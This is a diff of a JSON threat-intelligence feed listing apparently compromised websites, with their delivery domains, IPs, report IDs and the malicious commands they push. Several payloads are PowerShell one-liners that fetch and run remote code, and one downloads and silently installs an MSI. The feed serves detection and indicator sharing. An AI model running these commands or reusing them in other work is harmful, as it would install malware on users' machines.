@@ -1,5 +1,46 @@
 [
   {
+    "UrlDomain": "atharvarealties.com",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "91.108.98.209"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwgmq76i0lru0omlkr8mx6sp",
+    "ScannedAt": "2026-11-14T16:37:57.382000+00:00"
+  },
+  {
+    "UrlDomain": "rohrsupport.de",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "87.106.41.189"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/a3a0979350a6065b",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/a3a0979350a6065b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/a3a0979350a6065b"
+    ],
+    "ReportId": "cmwgmq2yd0lr20omlqz1zffk5",
+    "ScannedAt": "2026-11-14T16:37:51.895000+00:00"
+  },
+  {
     "UrlDomain": "aar.urgentbusiness.com.ng",
     "DeliveryUrl": [
       "browse-cloud.codes"
@@ -7217,277 +7258,5 @@
     ],
     "ReportId": "cmwb12w7t00dj0nmlk3hyfwh0",
     "ScannedAt": "2026-11-10T18:33:07.281000+00:00"
-  },
-  {
-    "UrlDomain": "aodearborn.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "160.153.0.83"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwaxnd5200310nmlgzpibtwd",
-    "ScannedAt": "2026-11-10T16:57:03.843000+00:00"
-  },
-  {
-    "UrlDomain": "www.michelecolangelo.it",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.108.41"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwaxm2a9001w0nmlwsx9bvyo",
-    "ScannedAt": "2026-11-10T16:56:03.136000+00:00"
-  },
-  {
-    "UrlDomain": "corneroffice.it",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "93.186.249.49"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwaxluqw000g0nmllo533tq9",
-    "ScannedAt": "2026-11-10T16:55:53.296000+00:00"
-  },
-  {
-    "UrlDomain": "www.bagnosabbiadoro.net",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.110.72"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589"
-    ],
-    "ReportId": "cmwaxeq5000v60omlk1tfelit",
-    "ScannedAt": "2026-11-10T16:50:20.763000+00:00"
-  },
-  {
-    "UrlDomain": "blueangelfarm.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "50.116.92.255"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwaxcnir00u90omlix6kpm6e",
-    "ScannedAt": "2026-11-10T16:48:44.086000+00:00"
-  },
-  {
-    "UrlDomain": "zyraaminos.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "160.153.0.59"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwax9cpd00oa0omlvvewo7j9",
-    "ScannedAt": "2026-11-10T16:46:10.087000+00:00"
-  },
-  {
-    "UrlDomain": "rematesjudicialesmim.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.203.106"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwax543400mz0omlhv4opfht",
-    "ScannedAt": "2026-11-10T16:42:52.308000+00:00"
-  },
-  {
-    "UrlDomain": "mawuto.de",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer",
-      "base.gateway.tenderly.co"
-    ],
-    "PayloadUrl": [
-      "http://timelevel12.com/big"
-    ],
-    "IP": [
-      "91.204.46.73"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/44735eefdb1d4abd",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://base.gateway.tenderly.co",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/44735eefdb1d4abd'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/44735eefdb1d4abd"
-    ],
-    "ReportId": "cmwax209w00lg0oml25avrawp",
-    "ScannedAt": "2026-11-10T16:40:27.397000+00:00"
-  },
-  {
-    "UrlDomain": "hotelalritrovo.com",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "94.130.48.220"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwax1z2k00l70omluwxueoah",
-    "ScannedAt": "2026-11-10T16:40:25.825000+00:00"
-  },
-  {
-    "UrlDomain": "hammerenter.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "162.222.226.38"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwax1e7400k10omly5mt7cgu",
-    "ScannedAt": "2026-11-10T16:39:58.785000+00:00"
-  },
-  {
-    "UrlDomain": "www.carrozzeriatondi.it",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "31.11.36.10"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589"
-    ],
-    "ReportId": "cmwawy94v00gz0omlc6uxuw2c",
-    "ScannedAt": "2026-11-10T16:37:32.270000+00:00"
-  },
-  {
-    "UrlDomain": "siouxtax.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.218.220"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwawx39b00f90omlhj73t2rd",
-    "ScannedAt": "2026-11-10T16:36:37.913000+00:00"
-  },
-  {
-    "UrlDomain": "infoeds.com.br",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "192.185.211.127"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/4ebcfb3eddea4f02",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=d65376557fc4fca9033110520d4383d8c533c8c37d36a646",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/4ebcfb3eddea4f02'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/4ebcfb3eddea4f02"
-    ],
-    "ReportId": "cmwawrukx00c80omliy9fxkyr",
-    "ScannedAt": "2026-11-10T16:32:33.446000+00:00"
   }
 ]
